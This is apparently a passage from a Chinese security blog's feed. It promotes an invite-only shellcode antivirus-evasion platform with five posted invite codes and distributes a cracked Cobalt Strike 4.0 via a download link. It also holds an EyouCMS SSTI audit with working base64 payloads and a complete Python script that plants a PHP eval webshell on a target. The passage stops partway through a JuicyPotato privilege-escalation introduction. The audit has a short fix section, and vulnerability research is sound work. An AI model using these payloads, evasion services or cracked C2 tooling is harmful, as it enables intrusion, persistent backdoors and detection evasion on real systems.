        <content type="html"><![CDATA[<p>和几位dalao忙了几天</p><p>利用PHP+Python+GO三门语言写了一个在线shellcode免杀平台</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191618365.png" alt="image-20230419161815346"></p><p>在CS中生成X64的c shellcode，按照平台指定格式提交，即可一键生成免杀后门（过所有国产）</p><p>本人郑重承诺，不含任何后门，欢迎各位reverse确认！为防止滥用，就不开源出来了</p><p>我也不会收集大佬们的c2 ip，今年hw我并不参加</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191618899.png" alt="image-20230419161856885"></p><p>本在线平台仅限攻防演练、授权渗透测试中使用，严禁用于非法用途（居心叵测之人自重，本系统带有溯源机制）</p><p>使用注册码进行账号注册后，会自动获取最近两次登录的ip并进行绑定，其他ip无法登录，使用注册码前请谨慎<br>考虑</p><p>平台链接联系博主获取</p><p>现免费赠送5个邀请码，如果没领到联系我vx:J0o1ey997，定期会发邀请码</p><p>HXGzVWWxzWCZ63hL3XyHHbbBL5X1QY59</p><p>x1JkgLkNZXvenxBKENFeRw99VWU4JkcI</p><p>2fDUWgCDLPIyz4nlENz3CjJ7ngfjUy3g</p><p>EHF1Bf2JwdunjBtFpjR4xRzGwlGqfzl4</p><p>BJvK7h2CVfK2PdhnKpgxNUdWUEzHFr79</p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Eyoucms SSTI漏洞审计</title>
      <link href="/2020/03/25/Eyoucms-SSTI%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/"/>
      <url>/2020/03/25/Eyoucms-SSTI%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-审计起因"><a href="#0x01-审计起因" class="headerlink" title="0x01 审计起因"></a>0x01 审计起因</h3><p><img src="https://s1.ax1x.com/2020/03/25/8xGpDg.png" alt="8xGpDg.png"><br>由于在先知查看文章的时候无意看到了EyouCMS漏洞复现文章，于是产生了审计之心</p><h3 id="0x02-EyouCMS简介"><a href="#0x02-EyouCMS简介" class="headerlink" title="0x02 EyouCMS简介"></a>0x02 EyouCMS简介</h3><blockquote><p>EyouCms是基于TP5.0框架为核心开发的免费+开源的企业内容管理系统，专注企业建站用户需求。提供海量各行业模板，降低中小企业网站建设、网络营销成本，致力于打造用户舒适的建站体验。这是一套安全、简洁、免费的流行CMS，包含完整后台管理、前台展示，直接下载安装即可使用。 演示网址：[<a href="http://demo.eyoucms.com][2]">http://demo.eyoucms.com][2]</a> 官方网站：[<a href="http://www.eyoucms.com][3]">http://www.eyoucms.com][3]</a></p></blockquote><h3 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h3><p>进入<code>/application/api/controller/Ajax.php</code>中的**<code>function get_tag_memberlist</code>**方法</p><pre><code class="php">public function get_tag_memberlist()&#123;    if (IS_AJAX_POST) &#123;        $htmlcode = input(&#39;post.htmlcode/s&#39;);        $htmlcode = htmlspecialchars_decode($htmlcode);        $attarray = input(&#39;post.attarray/s&#39;);        $attarray = htmlspecialchars_decode($attarray);        $attarray = json_decode(base64_decode($attarray));        /*拼接完整的memberlist标签语法*/        $innertext = &quot;&#123;eyou:memberlist&quot;;        foreach ($attarray as $key =&gt; $val) &#123;            if (in_array($key, [&#39;js&#39;])) &#123;                continue;            &#125;            $innertext .= &quot; &#123;$key&#125;=&#39;&#123;$val&#125;&#39;&quot;;        &#125;        $innertext .= &quot; js=&#39;on&#39;&#125;&quot;;        $innertext .= $htmlcode;        $innertext .= &quot;&#123;/eyou:memberlist&#125;&quot;;        /*--end*/        $msg = $this-&gt;display($innertext); // 渲染模板标签语法        $data[&#39;msg&#39;] = $msg;        $this-&gt;success(&#39;读取成功！&#39;, null, $data);    &#125;    $this-&gt;error(&#39;加载失败！&#39;);&#125;</code></pre><p>3 Line: 判断是否AJAX请求<br>4 Line: 从post获取用户输入参数htmlcode的值并将结果赋值给$htmlcode<br>5 Line: 将$htmlcode中的实体字符转换为正常字符<br>7 Line: 从post获取用户输入参数attarray的值并将结果赋值给$attarray<br>8 Line: 将$attarray中的实体字符转换为正常字符<br>9 Line: 将$attarray进行base64解码再json解码<br>12 Line: 定义标签<br>13~18 Line: 使用foreach将$attay以键值对的方式遍历出来，判断每一个元素是否为js如果是那么直接进入下一次循环，否则“{$key}&#x3D;’{$val}’”连接到标签后面<br>19 Line: 闭合第一个标签<br>20 Line: 将$htmlcode拼接到标签后，作为内容使用<br>21 Line: 将闭合标签拼接到$innertext中<br>23 Line: 调用基类中的display方法并将$innertext传入</p><p>跟踪到<code>/core/library/think/Controll.php</code>文件中的**<code>display</code>**方法</p><pre><code class="php">protected function display($content = &#39;&#39;, $vars = [], $replace = [], $config = [])&#123;    return $this-&gt;view-&gt;display($content, $vars, $replace, $config);&#125;</code></pre><p>3 Line: 调用视图类中的display方法，并将$content、$vars、$replace、$config传入</p><p>跟踪到<code>/core/library/think/View.php</code>文件中的**<code>display</code>**方法</p><pre><code class="php">public function display($content, $vars = [], $replace = [], $config = [])&#123;    return $this-&gt;fetch($content, $vars, $replace, $config, true);&#125;</code></pre><p>3 Line: 调用当前类中的fetch方法并将并将$content、$vars、$replace、$config传入</p><p>跟踪到<code>/core/library/think/View.php</code>文件中的**<code>fetch</code>**方法</p><pre><code class="php">public function fetch($template = &#39;&#39;, $vars = [], $replace = [], $config = [], $renderContent = false)&#123;    // 模板变量    $vars = array_merge(self::$var, $this-&gt;data, $vars);    // 页面缓存    ob_start();    ob_implicit_flush(0);    // 渲染输出    try &#123;        $method = $renderContent ? &#39;display&#39; : &#39;fetch&#39;;        // 允许用户自定义模板的字符串替换        // $replace = array_merge($this-&gt;replace, $replace, (array) $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;));        $replace = array_merge($this-&gt;replace, (array) $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;), $replace); // 解决一个页面上调用多个钩子的冲突问题 by 小虎哥        /*插件模板字符串替换，不能放在构造函数，毕竟构造函数只执行一次 by 小虎哥*/        // if ($this-&gt;__isset(&#39;weappInfo&#39;)) &#123;        //     $weappInfo = $this-&gt;__get(&#39;weappInfo&#39;);        //     if (!empty($weappInfo[&#39;code&#39;])) &#123;        //         $replace[&#39;__WEAPP_TEMPLATE__&#39;] = ROOT_DIR.&#39;/&#39;.WEAPP_DIR_NAME.&#39;/&#39;.$weappInfo[&#39;code&#39;].&#39;/template&#39;;        //     &#125;        // &#125;        /*--end*/        $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;, $replace);        $this-&gt;engine-&gt;$method($template, $vars, $config);    &#125; catch (\Exception $e) &#123;        ob_end_clean();        throw $e;    &#125;    // 获取并清空缓存    $content = ob_get_clean();    // 内容过滤标签    Hook::listen(&#39;view_filter&#39;, $content);    // $this-&gt;checkcopyr($content);    return $content;&#125;</code></pre><p>4 Line: 将当前类中的成员属性$var、$data以及传入的$vars合并为一个数组并赋给$vars<br>7~8 Line: 开启页面缓存<br>11 Line: 使用三元运算符判断外部传入的$renderContent是否为真，若为真那么将display赋值给$method，否则将fetch赋值给$method<br>24 Line: 调用Think类中的$method方法并将$template、$vars、$config传入</p><p>跟踪到<code>/core/library/think/view/driver/Think.php</code>中的**<code>display</code>**方法</p><pre><code class="php">public function display($template, $data = [], $config = [])&#123;    $this-&gt;template-&gt;display($template, $data, $config);&#125;</code></pre><p>3 Line: 调用模板类中的display方法并将$template、$data、$config传入</p><p>跟踪到<code>/core/library/think/Template.php</code>中的**<code>display</code>**方法</p><pre><code class="php">public function display($content, $vars = [], $config = [])&#123;    if ($vars) &#123;        $this-&gt;data = $vars;    &#125;    if ($config) &#123;        $this-&gt;config($config);    &#125;    $cacheFile = $this-&gt;config[&#39;cache_path&#39;] . $this-&gt;config[&#39;cache_prefix&#39;] . md5($content) . &#39;.&#39; . ltrim($this-&gt;config[&#39;cache_suffix&#39;], &#39;.&#39;);    if (!$this-&gt;checkCache($cacheFile)) &#123;        // 缓存无效 模板编译        $this-&gt;compiler($content, $cacheFile);    &#125;    // 读取编译存储    $this-&gt;storage-&gt;read($cacheFile, $this-&gt;data);&#125;</code></pre><p>3<del>5 Line: 判断外部传入的$vars是否有值，若有那么则将$vars赋值给当前类中的成员属性data中<br>6</del>8 Line: 判断$config是否有值，若有那么将$config传入当前类中的config方法<br>9 Line: 生成缓存文件名称赋值给$cacheFile<br>10~13 Line: 判断是否没有$cacheFile这个缓存文件，为真则调用当前类中的compiler方法并且将$content及$cacheFile传入其中</p><p>跟踪到<code>/core/library/think/Template.php</code>中的**<code>compiler</code>**方法</p><pre><code class="php">private function compiler(&amp;$content, $cacheFile)&#123;    // 判断是否启用布局    if ($this-&gt;config[&#39;layout_on&#39;]) &#123;        if (false !== strpos($content, &#39;&#123;__NOLAYOUT__&#125;&#39;)) &#123;            // 可以单独定义不使用布局            $content = str_replace(&#39;&#123;__NOLAYOUT__&#125;&#39;, &#39;&#39;, $content);        &#125; else &#123;            // 读取布局模板            $layoutFile = $this-&gt;parseTemplateFile($this-&gt;config[&#39;layout_name&#39;]);            if (is_array($layoutFile)) &#123; // 引入模板的错误友好提示 by 小虎哥                $content = !empty($layoutFile[&#39;msg&#39;]) ? $layoutFile[&#39;msg&#39;] : $content;            &#125; else if ($layoutFile) &#123;                // 替换布局的主体内容                $content = str_replace($this-&gt;config[&#39;layout_item&#39;], $content, file_get_contents($layoutFile));            &#125;        &#125;    &#125; else &#123;        $content = str_replace(&#39;&#123;__NOLAYOUT__&#125;&#39;, &#39;&#39;, $content);    &#125;    // 模板解析    $this-&gt;parse($content);    if ($this-&gt;config[&#39;strip_space&#39;]) &#123;        /* 去除html空格与换行 */        $find    = [&#39;~&gt;\s+&lt;~&#39;, &#39;~&gt;(\s+\n|\r)~&#39;];        $replace = [&#39;&gt;&lt;&#39;, &#39;&gt;&#39;];        $content = preg_replace($find, $replace, $content);    &#125;    // 优化生成的php代码    $content = preg_replace(&#39;/\?&gt;\s*&lt;\?php\s(?!echo\b)/s&#39;, &#39;&#39;, $content);    // 模板过滤输出    $replace = $this-&gt;config[&#39;tpl_replace_string&#39;];    $content = str_replace(array_keys($replace), array_values($replace), $content);    // 添加安全代码及模板引用记录    $content = &#39;&lt;?php if (!defined(\&#39;THINK_PATH\&#39;)) exit(); /*&#39; . serialize($this-&gt;includeFile) . &#39;*/ ?&gt;&#39; . &quot;\n&quot; . $content;    // 编译存储    $this-&gt;storage-&gt;write($cacheFile, $content);    $this-&gt;includeFile = [];    return;&#125;</code></pre><p>23 Line: 将外部传入的$content传到当前类中的parse（解析模板）方法中</p><p>跟踪到<code>/core/library/think/Template.php</code>中的**<code>parse</code>**方法</p><pre><code class="php">public function parse(&amp;$content)&#123;    // 内容为空不解析    if (empty($content)) &#123;        return;    &#125;    // 替换eyou:literal标签内容    $this-&gt;parseEyouLiteral($content);    // 替换literal标签内容    $this-&gt;parseLiteral($content);    // 解析继承    $this-&gt;parseExtend($content);    // 解析布局    $this-&gt;parseLayout($content);    // 检查eyou:include语法  by 小虎哥    $this-&gt;parseEyouInclude($content);    // 检查include语法    $this-&gt;parseInclude($content);    // 替换包含文件中literal标签内容    $this-&gt;parseLiteral($content);    // 替换包含文件中eyou:literal标签内容    $this-&gt;parseEyouLiteral($content);    // 检查PHP语法    $this-&gt;parsePhp($content);    // 获取需要引入的标签库列表    // 标签库只需要定义一次，允许引入多个一次    // 一般放在文件的最前面    // 格式：&lt;taglib name=&quot;html,mytag...&quot; /&gt;    // 当TAGLIB_LOAD配置为true时才会进行检测    if ($this-&gt;config[&#39;taglib_load&#39;]) &#123;        $tagLibs = $this-&gt;getIncludeTagLib($content);        if (!empty($tagLibs)) &#123;            // 对导入的TagLib进行解析            foreach ($tagLibs as $tagLibName) &#123;                $this-&gt;parseTagLib($tagLibName, $content);            &#125;        &#125;    &#125;    // 预先加载的标签库 无需在每个模板中使用taglib标签加载 但必须使用标签库XML前缀    if ($this-&gt;config[&#39;taglib_pre_load&#39;]) &#123;        $tagLibs = explode(&#39;,&#39;, $this-&gt;config[&#39;taglib_pre_load&#39;]);        foreach ($tagLibs as $tag) &#123;            $this-&gt;parseTagLib($tag, $content);        &#125;    &#125;    // 内置标签库 无需使用taglib标签导入就可以使用 并且不需使用标签库XML前缀    $tagLibs = explode(&#39;,&#39;, $this-&gt;config[&#39;taglib_build_in&#39;]);    foreach ($tagLibs as $tag) &#123;        $this-&gt;parseTagLib($tag, $content, true);    &#125;    // 解析普通模板标签 &#123;$tagName&#125;    $this-&gt;parseTag($content);    // 还原被替换的eyou:Literal标签    $this-&gt;parseEyouLiteral($content, true);    // 还原被替换的Literal标签    $this-&gt;parseLiteral($content, true);    return;&#125;</code></pre><p>24 Line: 调用当前类中的parsePhp（解析php标签）方法并将$content传入</p><p>跟踪到<code>/core/library/think/Template.php</code>中的**<code>parsePhp</code>**方法</p><pre><code class="php">private function parsePhp(&amp;$content)&#123;    // 短标签的情况要将&lt;?标签用echo方式输出 否则无法正常输出xml标识    $content = preg_replace(&#39;/(&lt;\?(?!php|=|$))/i&#39;, &#39;&lt;?php echo \&#39;\\1\&#39;; ?&gt;&#39; . &quot;\n&quot;, $content);    // 过滤eval函数，防止被注入执行任意代码 by 小虎哥    $view_replace_str = config(&#39;view_replace_str&#39;);    if (isset($view_replace_str[&#39;__EVAL__&#39;])) &#123;        if (stristr($content, &#39;&#123;eyou:php&#125;&#39;)) &#123; // 针对&#123;eyou:php&#125;标签语法处理            preg_match_all(&#39;/&#123;eyou\:php&#125;.*&#123;\/eyou\:php&#125;/iUs&#39;, $content, $matchs);            $matchs = !empty($matchs[0]) ? $matchs[0] : [];            if (!empty($matchs)) &#123;                foreach($matchs as $key =&gt; $val)&#123;                    $valNew = preg_replace(&#39;/&#123;(\/)?eyou\:php&#125;/i&#39;, &#39;&#39;, $val);                    $valNew = preg_replace(&quot;/([\W]+)eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);                    $valNew = preg_replace(&quot;/^eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);                    $valNew = &quot;&#123;eyou:php&#125;&#123;$valNew&#125;&#123;/eyou:php&#125;&quot;;                    $content = str_ireplace($val, $valNew, $content);                &#125;            &#125;        &#125; else if (stristr($content, &#39;&#123;php&#125;&#39;)) &#123; // 针对&#123;php&#125;标签语法处理            preg_match_all(&#39;/&#123;php&#125;.*&#123;\/php&#125;/iUs&#39;, $content, $matchs);            $matchs = !empty($matchs[0]) ? $matchs[0] : [];            if (!empty($matchs)) &#123;                foreach($matchs as $key =&gt; $val)&#123;                    $valNew = preg_replace(&#39;/&#123;(\/)?php&#125;/i&#39;, &#39;&#39;, $val);                    $valNew = preg_replace(&quot;/([\W]+)eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);                    $valNew = preg_replace(&quot;/^eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);                    $valNew = &quot;&#123;php&#125;&#123;$valNew&#125;&#123;/php&#125;&quot;;                    $content = str_ireplace($val, $valNew, $content);                &#125;            &#125;        &#125; else if (false !== strpos($content, &#39;&lt;?php&#39;)) &#123; // 针对原生php语法处理            $content = preg_replace(&quot;/(@)?eval(\s*)\(/i&quot;, &#39;intval(&#39;, $content);            $this-&gt;config[&#39;tpl_deny_php&#39;] &amp;&amp; $content = preg_replace(&quot;/\?\bphp\b/i&quot;, &quot;？ｍｕｍａ&quot;, $content);        &#125;    &#125;    // end    // PHP语法检查    if ($this-&gt;config[&#39;tpl_deny_php&#39;] &amp;&amp; false !== strpos($content, &#39;&lt;?php&#39;)) &#123;        if (config(&#39;app_debug&#39;)) &#123; // 调试模式下中断模板渲染 by 小虎哥            throw new Exception(&#39;not allow php tag&#39;, 11600);        &#125; else &#123; // 运营模式下继续模板渲染 by 小虎哥            echo(lang(&#39;not allow php tag&#39;));        &#125;    &#125;    return;&#125;</code></pre><p>4 Line: 将模板中php短标签转换为<?php echo ‘1’?></p><p>21 Line: 判断传入的$content中是否包含了{php}</p><p>22 Line: 使用正则表达式匹配出$content中所有包含了“{php}任意内容{&#x2F;php}”的标签</p><p>23 Line: 使用三目运算符判断匹配出来的数组中的第0个元素是否有值，如果有值那么将第0个元素的值赋给$matchs否则将空数组赋给$matchs</p><p>24 Line: 判断$matchs不为空</p><p>25 Line: 将$matchs使用foreach循环遍历</p><p>26 Line: 将$val中的“{&#x2F;任意空白字符php}”替换为空并赋给$valnew</p><p>27 Line: 将$valnew中的“多个或零个0-9A-Za-Z_eval(”替换为“intval(”</p><p>28 Line: 将$valnew中的“开始为eval任意空白字符(”替换为“intval(”</p><p>29 Line: 将字符串“{php}{$valNew}{&#x2F;php}”赋给$valnew</p><p>30 Line: 将$content中的$val替换为$valNew</p><h3 id="0x04-漏洞探测"><a href="#0x04-漏洞探测" class="headerlink" title="0x04 漏洞探测"></a>0x04 漏洞探测</h3><pre><code>Payload:attarray=eyJ7cGhwfXBocGluZm8oKTt7XC9waHB9Ijoie3BocH1waHBpbmZvKCk7e1wvcGhwfSJ9&amp;html=&#123;php&#125;phpinfo();&#123;/php&#125;</code></pre><p><img src="https://s1.ax1x.com/2020/03/25/8xGqLF.png" alt="8xGqLF.png"></p><h3 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h3><p>Payload生成方式:</p><pre><code>base64_encode(jsonstring)</code></pre><p>eval会被替换成intval，所以我们采用base64加密写入webshell的方式<br>php代码如下：</p><pre><code>file_put_contents(&quot;./wait.php&quot;,base64_decode(&quot;PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==&quot;));</code></pre><p>PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs&#x2F;Pg&#x3D;&#x3D;内容：</p><pre><code>&lt;?php eval($_REQUEST[“w”]);?&gt;</code></pre><p>将php标签转换为json格式并加密：</p><pre><code class="php">print base64_encode(json_encode(array(&quot;&#123;php&#125;file_put_contents(&#39;./wait.php&#39;,base64_decode(\&quot;PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==\&quot;));&#123;/php&#125;&quot;=&gt;&quot;&#123;php&#125;file_put_contents(&#39;./wait.php&#39;,base64_decode(\&quot;PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==\&quot;));&#123;/php&#125;&quot;)));eyJ7cGhwfWZpbGVfcHV0X2NvbnRlbnRzKCcuXC93YWl0LnBocCcsYmFzZTY0X2RlY29kZShcIlBEOXdhSEFnWVhOelpYSjBLQ1JmVWtWUlZVVlRWRnNpZHlKZEtUc1wvUGc9PVwiKSk7e1wvcGhwfSI6IntwaHB9ZmlsZV9wdXRfY29udGVudHMoJy5cL3dhaXQucGhwJyxiYXNlNjRfZGVjb2RlKFwiUEQ5d2FIQWdZWE56WlhKMEtDUmZVa1ZSVlVWVFZGc2lkeUpkS1RzXC9QZz09XCIpKTt7XC9waHB9In0=</code></pre><p>pyload:</p><pre><code>attarray=eyJ7cGhwfWZpbGVfcHV0X2NvbnRlbnRzKCcuXC93YWl0LnBocCcsYmFzZTY0X2RlY29kZShcIlBEOXdhSEFnWVhOelpYSjBLQ1JmVWtWUlZVVlRWRnNpZHlKZEtUc1wvUGc9PVwiKSk7e1wvcGhwfSI6IntwaHB9ZmlsZV9wdXRfY29udGVudHMoJy5cL3dhaXQucGhwJyxiYXNlNjRfZGVjb2RlKFwiUEQ5d2FIQWdZWE56WlhKMEtDUmZVa1ZSVlVWVFZGc2lkeUpkS1RzXC9QZz09XCIpKTt7XC9waHB9In0=&amp;htmlcode=bb</code></pre><p><img src="https://s1.ax1x.com/2020/03/25/8xJJFs.png" alt="8xJJFs.png"></p><p>htmlcode参数作为随机方式传递</p><h3 id="0x06-漏洞修复"><a href="#0x06-漏洞修复" class="headerlink" title="0x06 漏洞修复"></a>0x06 漏洞修复</h3><p>可以使用assign方法来将标签直接替换成我们需要的值，而不是将标签传入display方法中将标签直接编译，危险性大大提升</p><h3 id="0x07-自动化测试脚本"><a href="#0x07-自动化测试脚本" class="headerlink" title="0x07 自动化测试脚本"></a>0x07 自动化测试脚本</h3><pre><code class="console">silly@PenetrationOs:~#: python eyoucms-ssti.py -u http://192.168.1.106:8085/ -o abc[+] 正在请求目标地址:http://192.168.1.106:8085/?m=api&amp;c=ajax&amp;a=get_tag_memberlist 目标地址http://192.168.1.106:8085/?m=api&amp;c=ajax&amp;a=get_tag_memberlist存活[+] 正在向目标地址http://192.168.1.106:8085/?m=api&amp;c=ajax&amp;a=get_tag_memberlist写入abc.php 疑似成功写入Webshell[+] 正在探测Webshell(http://192.168.1.106:8085/abc.php)是否存活 Webshell(http://192.168.1.106:8085/abc.php)已存活 密码：ceshi</code></pre><pre><code>#!/usr/bin/python -*- coding: UTF-8 -*-import requestsimport sys,getoptimport json,base64import timeclass Eyoucms:    session = None    headers = None    password = &quot;ceshi&quot;    output = &quot;ceshi&quot;    requesturi = &quot;/?m=api&amp;c=ajax&amp;a=get_tag_memberlist&quot;    def __init__(self,headers):        self.headers = headers        self.getparam(sys.argv[1:])        self.requestsdata = &#123;            &quot;attarray&quot;:self.createpyload(),            &quot;htmlcode&quot;:time.time()        &#125;        self.run()    def getparam(self,argv):        try:            options, args = getopt.getopt(argv, &quot;h:u:p:o:&quot;, [&quot;help&quot;, &quot;url=&quot;,&quot;password=&quot;,&quot;output=&quot;])        except getopt.GetoptError:            print &#39;eyoucms-ssti.py -u url -p password -o outputfile&#39;            return        for option, value in options:            if option in (&quot;-h&quot;, &quot;--help&quot;):                print &#39;eyoucms-ssti.py -u url&#39;            if option in (&quot;-u&quot;, &quot;--url&quot;):                if(self.request(value).status_code != 404):                    self.url = value            if option in (&quot;-p&quot;, &quot;--password&quot;):                    if(value != None):                        self.password = value                    else:                        self.password = &quot;ceshi&quot;            if option in (&quot;-o&quot;, &quot;--output&quot;):                    if(value != None):                        self.output = value.replace(&quot;.php&quot;,&quot;&quot;)                    else:                        self.output = &quot;ceshi&quot;    def run(self):        url = self.url.rstrip(&#39;/&#39;)+self.requesturi        print &quot;[+] 正在请求目标地址:%s&quot;%(url)        if(self.request(url).status_code == 200):            print &quot; 目标地址%s存活&quot;%url        else:            print &quot;[-] 目标地址%s探测失败&quot;%url            return        print &quot;[+] 正在向目标地址%s写入%s.php&quot;%(url,self.output)        if(self.request(url,&quot;post&quot;).status_code == 200):            print &quot; 疑似成功写入Webshell&quot;        shell = self.url.rstrip(&#39;/&#39;)+&quot;/%s.php&quot;%self.output        print &quot;[+] 正在探测Webshell(%s)是否存活&quot;%(shell)        if(self.request(shell).status_code == 200):            print &quot; Webshell(%s)已存活\n 密码：%s&quot;%(shell,self.password)    def createpyload(self):        short = base64.b64encode(&quot;&lt;php eval($_REQUEST[%s]);?&gt;&quot;%self.password)        file = self.output        payload = &#123;            &quot;&#123;php&#125;1&#123;/php&#125;&quot;:&quot;&#123;php&#125;file_put_contents(&#39;./%s.php&#39;,base64_decode(&#39;%s&#39;));&#123;/php&#125;&quot;%(file,short)        &#125;        return base64.b64encode(json.dumps(payload))    def request(self,url,method=&quot;get&quot;):        respone = None        if(not self.session):            self.session = requests.Session()        if(method == &quot;get&quot;):            try:                respone = self.session.get(url=url,headers=self.headers)            except requests.exceptions.ConnectTimeout:                print &quot;[-] 请求%s超时&quot;%url                return            except requests.exceptions.ConnectionError:                print &quot;[-] 请求%s无效&quot;%url                return            return respone        elif(method == &quot;post&quot;):            try:                respone = self.session.post(url=url,data=self.requestsdata,headers=self.headers)            except requests.exceptions.ConnectTimeout:                print &quot;[-] 请求%s超时&quot;%url                return            except requests.exceptions.ConnectionError:                print &quot;[-] 请求%s无效&quot;%url                return        return respone   if __name__ == &quot;__main__&quot;:    headers = &#123;        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0&quot;,        &quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;    &#125;    Eyoucms(headers)</code></pre><p>###漏洞影响范围<br>  EyouCMS&lt;&#x3D;1.41</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自制CS 4.0 去暗桩/VNC修复/x64Payload修复/终极汉化版本</title>
      <link href="/2020/03/21/%E8%87%AA%E5%88%B6CS-4-0-%E5%8E%BB%E6%9A%97%E6%A1%A9-VNC%E4%BF%AE%E5%A4%8D-x64Payload%E4%BF%AE%E5%A4%8D-%E7%BB%88%E6%9E%81%E6%B1%89%E5%8C%96%E7%89%88%E6%9C%AC/"/>
      <url>/2020/03/21/%E8%87%AA%E5%88%B6CS-4-0-%E5%8E%BB%E6%9A%97%E6%A1%A9-VNC%E4%BF%AE%E5%A4%8D-x64Payload%E4%BF%AE%E5%A4%8D-%E7%BB%88%E6%9E%81%E6%B1%89%E5%8C%96%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>两天过去了，我知道，大家都在等CS完美破解版</p><p>从CS4.0出了以后，足足折腾两天了。暗桩,x64 payload,vnc支持等等问题层出不穷</p><p>而且官方也没有编写windows下启动teamserver的批处理文件</p><p>自己动手，丰衣足食！</p><p>参考先知一位师傅和国外某牛的修复方法，CS4.0去暗桩，windows teamserver支持，vnc修复，x64 payload修复，汉化支持 终极版本今天发布！！</p><p>如果不需要汉化的话，在start.bat中去掉agent即可</p><p>站着干嘛，进来白嫖啊</p><p>链接：<a href="https://pan.baidu.com/s/11rJVvgKviN82sVOrpHoSlg">https://pan.baidu.com/s/11rJVvgKviN82sVOrpHoSlg</a><br>提取码：z44m</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191702649.png" alt="8RwtOS.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微软不当洞的漏洞-Windows提权神器JuicyPotato</title>
      <link href="/2019/09/13/%E5%BE%AE%E8%BD%AF%E4%B8%8D%E5%BD%93%E6%B4%9E%E7%9A%84%E6%BC%8F%E6%B4%9E-Windows%E6%8F%90%E6%9D%83%E7%A5%9E%E5%99%A8JuicyPotato/"/>
      <url>/2019/09/13/%E5%BE%AE%E8%BD%AF%E4%B8%8D%E5%BD%93%E6%B4%9E%E7%9A%84%E6%BC%8F%E6%B4%9E-Windows%E6%8F%90%E6%9D%83%E7%A5%9E%E5%99%A8JuicyPotato/</url>
      
        <content type="html"><![CDATA[<h2 id="0X00-Juicy-Potato简介"><a href="#0X00-Juicy-Potato简介" class="headerlink" title="0X00-Juicy-Potato简介"></a>0X00-Juicy-Potato简介</h2><p>Juicy Potato江湖人称烂土豆，是在MS16-075漏洞利用工具RottenPotatoN工具的基础上做了扩展（A sugared version of RottenPotatoNG, with a bit of juice, i.e. <strong>another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM</strong>*）</p><p>追根到底是一款Windows的本地提权工具，利用了COM对象进行提权，相比RottenPotatoNG适用范围更加广泛（正如作者所说with a bit of juice）</p><p>使用Juicy Potato这款提权工具的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，因此带有一定的局限性，对权限有一定要求，并非万能神器</p><p>Juicy Potato的项目官网如下：</p><p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p><p>这款提权工具其实早在18年末就有老外开发出来了，但是吧，依然没有进入到很多人的视野中，今天写这篇文章也是站在很多大佬的肩膀上进行总结与开新枝，如有错误，希望大家能及时斧正</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191606699.png" alt="image"></p><h3 id="0x01-Juicy-potato项目功能点"><a href="#0x01-Juicy-potato项目功能点" class="headerlink" title="0x01-Juicy-potato项目功能点"></a>0x01-Juicy-potato项目功能点</h3><h5 id="①Target-CLSID"><a href="#①Target-CLSID" class="headerlink" title="①Target CLSID"></a>①Target CLSID</h5><p>选择你想要的任何CLSID。</p><p>目前作者的官方github项目中已经给出了windows版本的CLSID列表。</p><h5 id="②COM-Listening-port"><a href="#②COM-Listening-port" class="headerlink" title="②COM Listening port"></a><strong>②COM Listening port</strong></h5><p>设置你需要的COM侦听端口</p><h5 id="③COM-Listening-IP-address"><a href="#③COM-Listening-IP-address" class="headerlink" title="③COM Listening IP address"></a><strong>③COM Listening IP address</strong></h5><p>设置COM组件监听的目标ip</p><h5 id="④Process-creation-mode"><a href="#④Process-creation-mode" class="headerlink" title="④Process creation mode"></a><strong>④Process creation mode</strong></h5><p>取决于模拟用户的权限，有以下三个选择：</p><blockquote><p>CreateProcessWithToken (需要SeImpersonate权限)</p><p>CreateProcessAsUser (需要SeAssignPrimaryToken权限)</p><p>both(综合以上两种)</p></blockquote><h5 id="⑤Process-to-launch"><a href="#⑤Process-to-launch" class="headerlink" title="⑤Process to launch"></a><strong>⑤Process to launch</strong></h5><p>如果JuIcy potato利用成功，则启动可执行文件或脚本</p><h5 id="⑥Process-Argument"><a href="#⑥Process-Argument" class="headerlink" title="⑥Process Argument"></a><strong>⑥Process Argument</strong></h5><p>自定义已启动的进程参数</p><h5 id="⑦与远程RPC服务器交互"><a href="#⑦与远程RPC服务器交互" class="headerlink" title="⑦与远程RPC服务器交互"></a>⑦与远程RPC服务器交互</h5><h3 id="0x02-Juicy-Potato局限性"><a href="#0x02-Juicy-Potato局限性" 